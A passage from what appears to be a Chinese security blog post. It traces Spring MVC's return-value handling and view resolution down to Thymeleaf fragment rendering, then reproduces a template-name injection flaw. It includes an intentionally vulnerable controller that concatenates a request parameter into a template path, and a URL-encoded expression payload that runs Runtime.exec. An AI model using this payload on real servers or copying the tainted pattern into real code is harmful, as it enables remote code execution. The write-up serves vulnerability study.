            //通过handleReturnValue根据返回值的类型和返回值将不同的属性设置到ModelAndViewContainer中。
                this.returnValueHandlers.handleReturnValue(returnValue, this.getReturnValueType(returnValue), mavContainer, webRequest);
            } catch (Exception var6) {
                if (logger.isTraceEnabled()) {
                    logger.trace(this.formatErrorForReturnValue(returnValue), var6);
                }
                throw var6;
            }
下面分析`handleReturnValue`方法。
  * `selectHandler`根据返回值和类型找到不同的`HandlerMethodReturnValueHandler`，这里得到了`ViewNameMethodReturnValueHandler`,具体怎么得到的就不分析了。
  * 调用`handler.handleReturnValue`，这里得到不同的`HandlerMethodReturnValueHandler`处理的方式也不相同。
    public void handleReturnValue(@Nullable Object returnValue, MethodParameter returnType, ModelAndViewContainer mavContainer, NativeWebRequest webRequest) throws Exception {
            //获取handler
            HandlerMethodReturnValueHandler handler = this.selectHandler(returnValue, returnType);
            if (handler == null) {
                throw new IllegalArgumentException("Unknown return value type: " + returnType.getParameterType().getName());
            } else {
                //执行handleReturnValue操作
                handler.handleReturnValue(returnValue, returnType, mavContainer, webRequest);
            }
        }
`ViewNameMethodReturnValueHandler#handleReturnValue`
  * 判断返回值类型是否为字符型，设置`mavContainer.viewName`
  * 判断返回值是否以`redirect:`开头，如果是的话则设置重定向的属性
    public void handleReturnValue(@Nullable Object returnValue, MethodParameter returnType, ModelAndViewContainer mavContainer, NativeWebRequest webRequest) throws Exception {
            if (returnValue instanceof CharSequence) {
                String viewName = returnValue.toString();
                //设置返回值为viewName
                mavContainer.setViewName(viewName);
                //判断是否需要重定向
                if (this.isRedirectViewName(viewName)) {
                    mavContainer.setRedirectModelScenario(true);
                }
            } else if (returnValue != null) {
                throw new UnsupportedOperationException("Unexpected return type: " + returnType.getParameterType().getName() + " in method: " + returnType.getMethod());
            }
        }
通过上面的操作，将返回值设置为`mavContainer.viewName`,执行上述操作后返回到`RequestMappingHandlerAdapter#invokeHandlerMethod`中。通过`getModelAndView`获取`ModelAndView`对象。
    protected ModelAndView invokeHandlerMethod(HttpServletRequest request, HttpServletResponse response, HandlerMethod handlerMethod) throws Exception {
           ...
                ModelAndView var15;
                invocableMethod.invokeAndHandle(webRequest, mavContainer, new Object[0]);
                if (asyncManager.isConcurrentHandlingStarted()) {
                    result = null;
                    return (ModelAndView)result;
                }
                //获取ModelAndView对象
                var15 = this.getModelAndView(mavContainer, modelFactory, webRequest);
            } finally {
                webRequest.requestCompleted();
            }
            return var15;
        }
`getModelAndView`根据`viewName`和`model`创建`ModelAndView`对象并返回。
    private ModelAndView getModelAndView(ModelAndViewContainer mavContainer, ModelFactory modelFactory, NativeWebRequest webRequest) throws Exception {
            modelFactory.updateModel(webRequest, mavContainer);
            //判断RequestHandled是否为True，如果是则不会创建ModelAndView对象
            if (mavContainer.isRequestHandled()) {
                return null;
            } else {
                ModelMap model = mavContainer.getModel();
                //创建ModelAndView对象
                ModelAndView mav = new ModelAndView(mavContainer.getViewName(), model, mavContainer.getStatus());
                if (!mavContainer.isViewReference()) {
                    mav.setView((View)mavContainer.getView());
                }
                if (model instanceof RedirectAttributes) {
                    Map flashAttributes = ((RedirectAttributes)model).getFlashAttributes();
                    HttpServletRequest request = (HttpServletRequest)webRequest.getNativeRequest(HttpServletRequest.class);
                    if (request != null) {
                        RequestContextUtils.getOutputFlashMap(request).putAll(flashAttributes);
                    }
                }
                return mav;
            }
        }
### 获取视图
获取`ModelAndView`后，通过`DispatcherServlet#render`获取视图解析器并渲染。
    protected void render(ModelAndView mv, HttpServletRequest request, HttpServletResponse response) throws Exception {
            Locale locale = this.localeResolver != null ? this.localeResolver.resolveLocale(request) : request.getLocale();
            response.setLocale(locale);
            String viewName = mv.getViewName();
            View view;
            if (viewName != null) {
                //获取视图解析器
                view = this.resolveViewName(viewName, mv.getModelInternal(), locale, request);
                if (view == null) {
                    throw new ServletException("Could not resolve view with name '" + mv.getViewName() + "' in servlet with name '" + this.getServletName() + "'");
                }
            } else {
                view = mv.getView();
                if (view == null) {
                    throw new ServletException("ModelAndView [" + mv + "] neither contains a view name nor a View object in servlet with name '" + this.getServletName() + "'");
                }
            }
            if (this.logger.isTraceEnabled()) {
                this.logger.trace("Rendering view [" + view + "] ");
            }
            try {
                if (mv.getStatus() != null) {
                    response.setStatus(mv.getStatus().value());
                }
            //渲染
                view.render(mv.getModelInternal(), request, response);
            } catch (Exception var8) {
                if (this.logger.isDebugEnabled()) {
                    this.logger.debug("Error rendering view [" + view + "]", var8);
                }
                throw var8;
            }
        }
获取视图解析器在`DispatcherServlet#resolveViewName`中完成，循环遍历所有视图解析器解析视图，解析成功则返回。
    protected View resolveViewName(String viewName, @Nullable Map model, Locale locale, HttpServletRequest request) throws Exception {
            if (this.viewResolvers != null) {
                Iterator var5 = this.viewResolvers.iterator();
            //循环遍历所有的视图解析器获取视图
                while(var5.hasNext()) {
                    ViewResolver viewResolver = (ViewResolver)var5.next();
                    View view = viewResolver.resolveViewName(viewName, locale);
                    if (view != null) {
                        return view;
                    }
                }
            }
            return null;
        }
在`Demo`中有5个视图解析器。
本以为会在`ThymeleafViewResolver`中获取视图，实际调试发现`ContentNegotiatingViewResolver`中已经获取到了视图。
`ContentNegotiatingViewResolver`视图解析器允许使用同样的数据获取不同的View。支持下面三种方式。
>   1. 使用扩展名  
>    
>  返回结果为XML  
>    
>  返回结果为JSON  
>    
>  使用默认view呈现，比如JSP
>
>   2. HTTP Request Header中的Accept，Accept 分别是 text/jsp, text/pdf, text/xml,
> text/json, 无Accept 请求头
>
>   3. 使用参数  
>    
>  返回结果为XML  
>    
>  返回结果为JSON
>
>
`ContentNegotiatingViewResolver#resolveViewName`
  * `getCandidateViews`循环调用所有的ViewResolver解析视图，解析成功放到视图列表中返回。同样也会根据Accept头得到后缀并通过ViewResolver解析视图。
  * `getBestView`根据Accept头获取最优的视图返回。
    public View resolveViewName(String viewName, Locale locale) throws Exception {
            RequestAttributes attrs = RequestContextHolder.getRequestAttributes();
            Assert.state(attrs instanceof ServletRequestAttributes, "No current ServletRequestAttributes");
            List requestedMediaTypes = this.getMediaTypes(((ServletRequestAttributes)attrs).getRequest());
            if (requestedMediaTypes != null) {
                //获取可以解析当前视图的列表。
                List candidateViews = this.getCandidateViews(viewName, locale, requestedMediaTypes);
                //根据Accept头获取一个最优的视图返回
                View bestView = this.getBestView(candidateViews, requestedMediaTypes, attrs);
                if (bestView != null) {
                    return bestView;
                }
            }
        ...
    }
### 视图渲染
得到View后，调用render方法渲染，也就是`ThymleafView#render`渲染。`render`方法中又通过调用`renderFragment`完成实际的渲染工作。
## 漏洞复现
我这里使用[ **spring-view-manipulation**](https://github.com/veracode-
research/spring-view-manipulation) 项目来做漏洞复现。
### templatename
#### 漏洞代码
    @GetMapping("/path")
    public String path(@RequestParam String lang) {
        return "user/" + lang + "/welcome"; //template path is tainted
    }
#### POC
    __$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__::.x
#### 漏洞原理
在`renderFragment`渲染的过程中，存在如下代码。
  * 当TemplateName中不包含`::`则将`viewTemplateName`赋值给`templateName`。
  * 如果包含`::`则代表是一个片段表达式，则需要解析`templateName`和`markupSelectors`。
    protected void renderFragment(Set markupSelectorsToRender, Map model, HttpServletRequest request, HttpServletResponse response) throws Exception {
          ...
          //viewTemplateName中包含::则当作片段表达式执行
           if (!viewTemplateName.contains("::")) {
                    templateName = viewTemplateName;
                    markupSelectors = null;